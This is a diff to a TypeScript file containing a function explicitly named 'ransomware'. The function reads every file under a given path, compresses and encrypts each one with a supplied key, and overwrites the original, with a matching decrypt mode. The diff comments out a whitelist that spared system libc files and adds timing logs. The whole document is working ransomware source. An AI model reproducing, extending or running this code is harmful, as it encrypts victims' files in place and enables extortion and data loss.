@@ -3,14 +3,14 @@ import fs from "fs";
 import crypto from "crypto";
 import path from "path";
 
-
+/*
 const removeElementsInWhiteList = (listOfFiles: string[]) => {
   const whitelist = [
     "ld-musl-aarch64.so.1",
     "libc.musl-aarch64.so.1",
   ];
 
-/* This code takes to long 
+// This code takes to long 
  *
  * const newList = [];
 
@@ -38,9 +38,10 @@ const removeElementsInWhiteList = (listOfFiles: string[]) => {
     }
   }
   return newList;
-  */
+  //
   return listOfFiles;
 }
+*/
 
 const readdir = (directory: string) => {
   let fileList: string[] = [];
@@ -210,16 +211,34 @@ const decrypt = (data: Buffer, password: string) => {
 const ransomware = (options: string) => {
   options = options.substring(12, options.length);
   const [mode, key, path, speed] = options.split(" ");
-  const filesInPath = removeElementsInWhiteList(readdir(path));
+
+console.log("Readding directories for files...");
+let oldTime = new Date();
+  const filesInPath = readdir(path);
+console.log(`Files found in ${+new Date() - +oldTime} ms`);
+
   console.log("Encrypting " + filesInPath.length + " files...");
   for(let i = 0; i < filesInPath.length; ++i) {
     console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`); 
     try {
       const fileData = loadFile(`${path}${filesInPath[i]}`);
       if (mode === "e" || mode === "encrypt") {
+
+console.log("Compressing file with level " + speed);
+oldTime = new Date();
         const compressedFileDataBuffer = compressBuffer(fileData, +speed);
+console.log(`${fileData.length} bytes compressed in ${+new Date() - +oldTime} ms`);
+
+console.log("Encrypting file...");
+oldTime = new Date();
         const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
+console.log(`File encrypted in ${+new Date() - +oldTime} ms`);
+
+console.log("Writing file to disk...");
+oldTime = new Date();
         saveToFile(`${path}${filesInPath[i]}`, encryptedDataBuffer);
+console.log(`File writed in ${+new Date() - +oldTime} ms`);
+
       } else {
         const decryptedDataBuffer = decrypt(fileData, key);
         const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
